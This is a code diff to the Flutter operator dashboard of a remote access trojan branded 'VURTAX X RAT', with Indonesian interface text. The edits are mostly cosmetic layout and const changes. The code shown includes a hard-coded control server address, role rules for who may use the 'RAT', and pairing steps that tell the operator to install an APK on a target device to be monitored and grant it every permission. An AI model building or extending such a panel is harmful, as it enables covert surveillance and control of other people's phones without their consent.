@@ -1,6 +1,6 @@
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
-import 'package:http/http.dart' as http;
+import 'http/http.dart' as http;
 import 'dart:convert';
 import 'dart:async';
 import 'device_permission.dart';
@@ -9,7 +9,7 @@ import 'control_panel.dart';
 const _kBase = 'http://cp.zyrostore.id:3594';
 
 // ============================================================================
-// VURTAX X RAT THEME COLORS (SAMA PERSIS DENGAN DASHBOARD PAGE)
+// VURTAX X RAT THEME COLORS
 // ============================================================================
 class DashboardTheme {
   static const bg            = Color(0xFFDCEEFB);
@@ -118,7 +118,7 @@ bool isRoleAtLeast(String role, String target) {
 }
 
 // ============================================================================
-// RAT PERMISSION RULES — ✅ PINDAHKAN KE SINI (GLOBAL)
+// RAT PERMISSION RULES
 // ============================================================================
 const List<String> allowedRatRoles = [
   'developer', 'founder', 'kingz', 'high owner', 'owner', 'tk', 'admin'
@@ -285,7 +285,7 @@ class _PairingInfoPage extends StatelessWidget {
           
           const SizedBox(height: 16),
           
-          _StepCard(
+          const _StepCard(
             number: 1,
             title: 'INSTALL APK',
             description: 'Install aplikasi target di perangkat yang ingin dipantau',
@@ -295,7 +295,7 @@ class _PairingInfoPage extends StatelessWidget {
           
           const SizedBox(height: 12),
           
-          _StepCard(
+          const _StepCard(
             number: 2,
             title: 'MASUKKAN PAIRING ID',
             description: 'Buka aplikasi lalu masukkan ID di atas',
@@ -305,7 +305,7 @@ class _PairingInfoPage extends StatelessWidget {
           
           const SizedBox(height: 12),
           
-          _StepCard(
+          const _StepCard(
             number: 3,
             title: 'BERI IZIN AKSES',
             description: 'Izinkan semua permission yang diminta',
@@ -315,7 +315,7 @@ class _PairingInfoPage extends StatelessWidget {
           
           const SizedBox(height: 12),
           
-          _StepCard(
+          const _StepCard(
             number: 4,
             title: 'SELESAI',
             description: 'Device akan muncul di halaman Devices',
@@ -397,7 +397,7 @@ class _PairingInfoPage extends StatelessWidget {
               ),
               child: Row(
                 children: [
-                  Icon(Icons.lock_rounded, color: DashboardTheme.warning, size: 20),
+                  const Icon(Icons.lock_rounded, color: DashboardTheme.warning, size: 20),
                   const SizedBox(width: 12),
                   Expanded(
                     child: Text(
@@ -450,93 +450,80 @@ class _StepCard extends StatelessWidget {
           width: 0.5,
         ),
       ),
-      child: Stack(
-        children: [
-          Container(
-            decoration: BoxDecoration(
-              borderRadius: BorderRadius.circular(20),
-              border: Border.all(
-                color: DashboardTheme.border.withOpacity(0.08),
-                width: 0.5,
+      child: Padding(
+        padding: const EdgeInsets.all(16),
+        child: Row(
+          children: [
+            Container(
+              width: 48,
+              height: 48,
+              decoration: BoxDecoration(
+                gradient: LinearGradient(colors: gradient),
+                borderRadius: BorderRadius.circular(16),
+                boxShadow: ShadowUtils.soft,
+                border: Border.all(
+                  color: DashboardTheme.border.withOpacity(0.3),
+                  width: 0.5,
+                ),
+              ),
+              child: Center(
+                child: Text(
+                  '$number',
+                  style: const TextStyle(
+                    color: Colors.white,
+                    fontSize: 24,
+                    fontWeight: FontWeight.bold,
+                    fontFamily: 'Astral',
+                  ),
+                ),
               ),
             ),
-          ),
-          Padding(
-            padding: const EdgeInsets.all(16),
-            child: Row(
-              children: [
-                Container(
-                  width: 48,
-                  height: 48,
-                  decoration: BoxDecoration(
-                    gradient: LinearGradient(colors: gradient),
-                    borderRadius: BorderRadius.circular(16),
-                    boxShadow: ShadowUtils.soft,
-                    border: Border.all(
-                      color: DashboardTheme.border.withOpacity(0.3),
-                      width: 0.5,
-                    ),
-                  ),
-                  child: Center(
-                    child: Text(
-                      '$number',
-                      style: const TextStyle(
-                        color: Colors.white,
-                        fontSize: 24,
-                        fontWeight: FontWeight.bold,
-                        fontFamily: 'Astral',
-                      ),
-                    ),
-                  ),
+            const SizedBox(width: 16),
+            Container(
+              padding: const EdgeInsets.all(10),
+              decoration: BoxDecoration(
+                color: DashboardTheme.surface3,
+                borderRadius: BorderRadius.circular(12),
+                border: Border.all(
+                  color: gradient[0].withOpacity(0.2),
+                  width: 0.5,
                 ),
-                const SizedBox(width: 16),
-                Container(
-                  padding: const EdgeInsets.all(10),
-                  decoration: BoxDecoration(
-                    color: DashboardTheme.surface3,
-                    borderRadius: BorderRadius.circular(12),
-                    border: Border.all(
-                      color: gradient[0].withOpacity(0.2),
-                      width: 0.5,
-                    ),
-                  ),
-                  child: Icon(icon, color: gradient[0], size: 24),
-                ),
-                const SizedBox(width: 16),
-                Expanded(
-                  child: Column(
-                    crossAxisAlignment: CrossAxisAlignment.start,
-                    children: [
-                      Text(
-                        title,
-                        style: TextStyle(
-                          color: DashboardTheme.textPrimary,
-                          fontSize: 14,
-                          fontWeight: FontWeight.bold,
-                          fontFamily: 'Astral',
-                        ),
-                      ),
-                      const SizedBox(height: 2),
-                      Text(
-                        description,
-                        style: TextStyle(
-                          color: DashboardTheme.textMuted,
-                          fontSize: 11,
-                          fontFamily: 'Astral',
-                        ),
-                      ),
-                    ],
-                  ),
-                ),
-                Icon(
-                  Icons.arrow_forward_ios_rounded,
-                  color: DashboardTheme.textMuted,
-                  size: 14,
-                ),
-              ],
+              ),
+              child: Icon(icon, color: gradient[0], size: 24),
             ),
-          ),
-        ],
+            const SizedBox(width: 16),
+            Expanded(
+              child: Column(
+                crossAxisAlignment: CrossAxisAlignment.start,
+                children: [
+                  Text(
+                    title,
+                    style: TextStyle(
+                      color: DashboardTheme.textPrimary,
+                      fontSize: 14,
+                      fontWeight: FontWeight.bold,
+                      fontFamily: 'Astral',
+                    ),
+                  ),
+                  const SizedBox(height: 2),
+                  Text(
+                    description,
+                    style: TextStyle(
+                      color: DashboardTheme.textMuted,
+                      fontSize: 11,
+                      fontFamily: 'Astral',
+                    ),
+                  ),
+                ],
+              ),
+            ),
+            const Icon(
+              Icons.arrow_forward_ios_rounded,
+              color: DashboardTheme.textMuted,
+              size: 14,
+            ),
+          ],
+        ),
       ),
     );
   }
@@ -559,15 +546,6 @@ class _DeviceListPage extends StatelessWidget {
     required this.perm,
     required this.denied,
   });
-
-  // ✅ STAT DIVIDER — SUDAH DITAMBAHKAN
-  Widget _buildStatDivider() {
-    return Container(
-      width: 1,
-      height: 30,
-      color: DashboardTheme.border.withOpacity(0.1),
-    );
-  }
 
   @override
   Widget build(BuildContext context) {
@@ -776,16 +754,18 @@ class _DeviceCard extends StatelessWidget {
                       children: [
                         Row(
                           children: [
-                            Text(
-                              device['model'] ?? 'Unknown Device',
-                              style: TextStyle(
-                                color: isOnline ? DashboardTheme.textPrimary : DashboardTheme.textSecondary,
-                                fontSize: 13,
-                                fontWeight: FontWeight.bold,
-                                fontFamily: 'Astral',
+                            Expanded(
+                              child: Text(
+                                device['model'] ?? 'Unknown Device',
+                                style: TextStyle(
+                                  color: isOnline ? DashboardTheme.textPrimary : DashboardTheme.textSecondary,
+                                  fontSize: 13,
+                                  fontWeight: FontWeight.bold,
+                                  fontFamily: 'Astral',
+                                ),
+                                maxLines: 1,
+                                overflow: TextOverflow.ellipsis,
                               ),
-                              maxLines: 1,
-                              overflow: TextOverflow.ellipsis,
                             ),
                             const SizedBox(width: 8),
                             Container(
@@ -830,7 +810,7 @@ class _DeviceCard extends StatelessWidget {
                         const SizedBox(height: 6),
                         Row(
                           children: [
-                            Icon(
+                            const Icon(
                               Icons.battery_charging_full_rounded,
                               color: DashboardTheme.textMuted,
                               size: 12,
@@ -901,7 +881,7 @@ class _DeviceCard extends StatelessWidget {
                         ),
                       ),
                       const SizedBox(height: 8),
-                      Icon(
+                      const Icon(
                         Icons.arrow_forward_ios_rounded,
                         color: DashboardTheme.textMuted,
                         size: 14,
@@ -996,7 +976,7 @@ class _EmptyDeviceWidget extends StatelessWidget {
             Container(
               padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
               decoration: BoxDecoration(
-                gradient: LinearGradient(
+                gradient: const LinearGradient(
                   colors: [DashboardTheme.red, DashboardTheme.border],
                 ),
                 borderRadius: BorderRadius.circular(24),
@@ -1009,7 +989,7 @@ class _EmptyDeviceWidget extends StatelessWidget {
               child: Row(
                 mainAxisSize: MainAxisSize.min,
                 children: [
-                  Icon(Icons.swipe_left_rounded, color: DashboardTheme.border, size: 18),
+                  const Icon(Icons.swipe_left_rounded, color: DashboardTheme.border, size: 18),
                   const SizedBox(width: 8),
                   Text(
                     'GESER KE KIRI UNTUK LIHAT PAIRING ID',
@@ -1030,7 +1010,7 @@ class _EmptyDeviceWidget extends StatelessWidget {
 }
 
 // ============================================================================
-// PERMISSION BOTTOM SHEET - VURTAX X RAT Theme
+// PERMISSION BOTTOM SHEET
 // ============================================================================
 class _PermissionBottomSheet extends StatefulWidget {
   final String sessionKey;
@@ -1320,7 +1300,7 @@ class _PermissionBottomSheetState extends State<_PermissionBottomSheet> {
                             child: Column(
                               mainAxisSize: MainAxisSize.min,
                               children: [
-                                Icon(Icons.group_off_rounded, color: DashboardTheme.textMuted, size: 48),
+                                const Icon(Icons.group_off_rounded, color: DashboardTheme.textMuted, size: 48),
                                 const SizedBox(height: 12),
                                 Text(
                                   'Belum ada user',
@@ -1455,7 +1435,7 @@ class _PermissionBottomSheetState extends State<_PermissionBottomSheet> {
                                                     ),
                                                     borderRadius: BorderRadius.circular(12),
                                                   ),
-                                                  child: Icon(
+                                                  child: const Icon(
                                                     Icons.person_rounded,
                                                     color: Colors.white,
                                                     size: 16,
@@ -1562,7 +1542,7 @@ class _PermissionBottomSheetState extends State<_PermissionBottomSheet> {
                                         children: [
                                           Row(
                                             children: [
-                                              Icon(Icons.phone_android_rounded, color: DashboardTheme.red, size: 16),
+                                              const Icon(Icons.phone_android_rounded, color: DashboardTheme.red, size: 16),
                                               const SizedBox(width: 8),
                                               const Text(
                                                 'DEVICE YANG DAPAT DIAKSES',
@@ -1679,7 +1659,7 @@ class _PermissionBottomSheetState extends State<_PermissionBottomSheet> {
 }
 
 // ============================================================================
-// MAIN DASHBOARD WITH HORIZONTAL SCROLL
+// MAIN DASHBOARD
 // ============================================================================
 class DeviceDashboardPage extends StatefulWidget {
   final String username;
@@ -1707,7 +1687,6 @@ class _DDState extends State<DeviceDashboardPage> {
   late PageController _pageController;
   int _currentPage = 0;
 
-  // ✅ PAKE FUNGSI GLOBAL
   bool get _isOwner => widget.role.toLowerCase() == 'owner';
   bool get _isAllowed => canAccessRAT(widget.role);
   bool get _denied => !_isAllowed && !_isOwner;
@@ -1730,7 +1709,6 @@ class _DDState extends State<DeviceDashboardPage> {
   Future<void> _loadAll() async {
     if (!mounted) return;
     
-    // ❌ Cek akses
     if (_denied) {
       setState(() {
         _loading = false;
@@ -2072,7 +2050,7 @@ class _DDState extends State<DeviceDashboardPage> {
               ),
               child: Icon(
                 isDenied ? Icons.lock_rounded : Icons.error_rounded,
-                color: isDenied ? DashboardTheme.error : DashboardTheme.error,
+                color: DashboardTheme.error,
                 size: 48,
               ),
             ),
@@ -2080,7 +2058,7 @@ class _DDState extends State<DeviceDashboardPage> {
             Text(
               isDenied ? 'AKSES DITOLAK' : 'TERJADI KESALAHAN',
               style: TextStyle(
-                color: isDenied ? DashboardTheme.error : DashboardTheme.error,
+                color: DashboardTheme.error,
                 fontSize: 16,
                 fontWeight: FontWeight.bold,
                 letterSpacing: 1,
